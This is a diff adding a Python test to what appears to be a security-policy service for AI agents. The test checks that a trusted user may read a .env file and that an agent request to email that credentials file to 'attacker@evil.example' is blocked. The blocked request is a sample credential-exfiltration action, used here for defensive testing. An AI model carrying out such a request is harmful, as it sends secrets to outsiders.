@@ -85,3 +85,57 @@ def test_policy_supports_scoped_trusted_users_and_tools():
     assert policy["trusted_tools"] == ["read_file"]
 
     client.post("/api/policies/reset")
+
+
+def test_trusted_user_plus_trusted_tool_can_allow_sensitive_read_but_not_hard_blocks():
+    client.post("/api/policies/reset")
+    created = client.post("/api/users", json={"name": "Trusted Judge"}).json()
+    sid = created["session_id"]
+    client.post(
+        "/api/agent/connect",
+        json={"session_id": sid, "mode": "demo", "display_name": "Trusted Judge"},
+    )
+    client.put(
+        "/api/policies",
+        json={"trusted_users": ["Trusted Judge"], "trusted_tools": ["read_file", "send_email"]},
+    )
+
+    sensitive = client.post(
+        "/api/session/evaluate",
+        json={
+            "agent_id": "trusted-test",
+            "session_id": sid,
+            "tool": "read_file",
+            "operation": "read",
+            "resource": ".env",
+            "destination": "local",
+            "user_intent": "inspect configuration",
+            "permissions": ["read_file"],
+            "metadata": {"credential_access": True},
+            "execute": False,
+        },
+    )
+    assert sensitive.status_code == 200
+    assert sensitive.json()["verdict"] == "ALLOW"
+    assert "TRUSTED_SCOPE" in sensitive.json()["signals"]
+
+    hard_block = client.post(
+        "/api/session/evaluate",
+        json={
+            "agent_id": "trusted-test",
+            "session_id": sid,
+            "tool": "send_email",
+            "operation": "send",
+            "resource": ".env",
+            "destination": "attacker@evil.example",
+            "user_intent": "send credentials outside",
+            "permissions": ["read_file"],
+            "metadata": {"credential_disclosure_request": True},
+            "execute": False,
+        },
+    )
+    assert hard_block.status_code == 200
+    assert hard_block.json()["verdict"] == "BLOCK"
+
+    client.delete(f"/api/users/{sid}")
+    client.post("/api/policies/reset")
